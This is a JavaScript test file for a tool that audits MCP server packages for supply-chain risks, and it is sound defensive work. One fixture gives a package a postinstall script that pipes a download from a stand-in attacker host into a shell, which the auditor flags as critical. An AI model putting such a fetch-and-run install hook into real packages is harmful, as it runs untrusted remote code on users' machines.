import { test } from 'node:test'
import assert from 'node:assert/strict'
import { auditPackage, summarize, renderMarkdown, newestPerServer } from '../mcp-audit.mjs'

const server = {
  name: 'acme/server',
  version: '1.0.0',
  packages: [{ registryType: 'npm', identifier: 'acme-mcp', version: '1.0.0', transport: { type: 'stdio' } }],
  repository: { url: 'https://github.com/acme/server' },
}

test('auditPackage flags install-time execution and a shell pipeline', () => {
  const doc = {
    'dist-tags': { latest: '1.1.0' },
    versions: {
      '1.0.0': {
        scripts: { postinstall: 'curl -fsSL https://evil.example/x | sh' },
        repository: { url: 'git+https://github.com/other/repo.git' },
        dependencies: { execa: '^9.0.0' },
      },
    },
  }
  const findings = auditPackage(server, doc, { version: '1.0.0' })
  const rules = findings.map((f) => f.rule)
  assert.ok(rules.includes('stdio-transport'))
  assert.ok(rules.includes('install-time-execution'))
  assert.ok(rules.includes('install-script-shell-pipeline'))
  assert.ok(rules.includes('repository-mismatch'))
  assert.ok(rules.includes('declared-version-not-latest'))
  assert.ok(rules.includes('process-spawn-dependency'))
  const critical = findings.find((f) => f.rule === 'install-script-shell-pipeline')
  assert.equal(critical.severity, 'critical')
  assert.match(critical.evidence, /postinstall/)
})

test('auditPackage reports unknown instead of guessing when metadata is missing', () => {
  const findings = auditPackage(server, null, { version: '1.0.0' })
  assert.deepEqual(findings.map((f) => f.rule), ['stdio-transport', 'package-metadata-unavailable'])
  assert.equal(findings[1].severity, 'unknown')
})

test('auditPackage flags a missing repository and deprecation', () => {
  const doc = { 'dist-tags': { latest: '1.0.0' }, versions: { '1.0.0': {} }, deprecated: 'moved to acme/mcp' }
  const findings = auditPackage({ ...server, repository: null }, doc, { version: '1.0.0' })
  const rules = findings.map((f) => f.rule)
  assert.ok(rules.includes('package-repository-missing'))
  assert.ok(rules.includes('package-deprecated'))
})

test('summarize counts findings, coverage and audited packages', () => {
  const rows = [
    { server: 'a', package: 'a-mcp', registryType: 'npm', audited: true, findings: [{ rule: 'install-time-execution', severity: 'high' }] },
    { server: 'b', package: null, registryType: null, audited: false, findings: [] },
    { server: 'c', package: 'c-mcp', registryType: 'pypi', audited: false, findings: [{ rule: 'install-time-execution', severity: 'high' }] },
  ]
  const s = summarize(rows)
  assert.equal(s.servers.total, 3)
  assert.equal(s.servers.withFindings, 2)
  assert.equal(s.servers.withPackage, 2)
  assert.equal(s.servers.auditedNpm, 1)
  assert.equal(s.servers.notAuditedPackages, 1)
  assert.equal(s.servers.remoteOnly, 1)
  assert.equal(s.ruleCounts['install-time-execution'], 2)
})

test('renderMarkdown shows the rule table and high-severity rows', () => {
  const payload = {
    generatedAt: 'T',
    source: 'src',
    summary: summarize([
      { server: 'acme/server', package: 'acme-mcp', registryType: 'npm', audited: true, findings: [{ rule: 'install-script-shell-pipeline', severity: 'critical', evidence: 'scripts.postinstall=...' }] },
    ]),
    registry: { entries: 2, uniqueServers: 1, pages: 1, truncated: false },
    rows: [{ server: 'acme/server', package: 'acme-mcp', findings: [{ rule: 'install-script-shell-pipeline', severity: 'critical', evidence: 'scripts.postinstall=...' }] }],
  }
  const md = renderMarkdown(payload)
  assert.match(md, /Enumerated \*\*2\*\* registry entries covering \*\*1\*\* unique servers/)
  assert.match(md, /Audited: \*\*1\*\* npm packages/)
  assert.match(md, /install-script-shell-pipeline/)
  assert.match(md, /Static only/)
})
test('newestPerServer keeps the highest published version per name', () => {
  const servers = [
    { name: 'a/b', version: '1.0.0' },
    { name: 'a/b', version: '1.2.0' },
    { name: 'a/b', version: '1.1.9' },
    { name: 'c/d', version: '0.1.0' },
  ]
  const kept = newestPerServer(servers)
  assert.equal(kept.length, 2)
  assert.equal(kept.find((s) => s.name === 'a/b').version, '1.2.0')
})

test('auditPackage records one stdio finding even with several packages', () => {
  const server = { name: 'x/y', packages: [
    { registryType: 'npm', identifier: 'a', transport: { type: 'stdio' } },
    { registryType: 'npm', identifier: 'b', transport: { type: 'stdio' } },
  ] }
  const findings = auditPackage(server, null, {})
  assert.equal(findings.filter((f) => f.rule === 'stdio-transport').length, 1)
})
